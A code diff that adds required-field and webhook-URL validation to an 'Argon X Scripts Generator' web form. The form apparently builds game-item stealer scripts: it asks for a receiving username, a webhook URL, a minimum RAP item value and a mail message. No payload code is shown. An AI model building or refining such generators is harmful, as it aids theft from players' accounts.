@@ -82,16 +82,16 @@
     <h1>Argon X Scripts Generator!</h1>
     <form id="scriptForm">
       <label for="username">Username:</label>
-      <input type="text" id="username" name="username"><br><br>
+      <input type="text" id="username" name="username" required><br><br>
 
       <label for="webhook">Webhook URL:</label>
-      <input type="text" id="webhook" name="webhook"><br><br>
+      <input type="url" id="webhook" name="webhook" required><br><br>
 
       <label for="minimumRAP">Minimum RAP:</label>
-      <input type="number" id="minimumRAP" name="minimumRAP"><br><br>
+      <input type="number" id="minimumRAP" name="minimumRAP" required><br><br>
 
       <label for="mailMessage">Mail Message:</label>
-      <input type="text" id="mailMessage" name="mailMessage"><br><br>
+      <input type="text" id="mailMessage" name="mailMessage" required><br><br>
 
       <label for="mouseLock">Enable Mouse Lock:</label>
       <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>
@@ -113,7 +113,14 @@
     document.addEventListener("DOMContentLoaded", function() {
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
-      
+
+      const urlPattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
+        '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.?)+[a-z]{2,}|'+ // domain name
+        '((\\d{1,3}\\.){3}\\d{1,3}))'+ // OR ip (v4) address
+        '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*'+ // port and path
+        '(\\?[;&a-z\\d%_.~+=-]*)?'+ // query string
+        '(\\#[-a-z\\d_]*)?$','i'); // fragment locator
+
       generateButton.addEventListener('click', function(event) {
         event.preventDefault(); 
 
@@ -127,6 +134,11 @@
 
         if (!username || !webhook || !minimumRAP || !mailMessage) {
           alert("Please fill in all fields.");
+          return;
+        }
+
+        if (!urlPattern.test(webhook)) {
+          alert("Please enter a valid webhook URL.");
           return;
         }
 
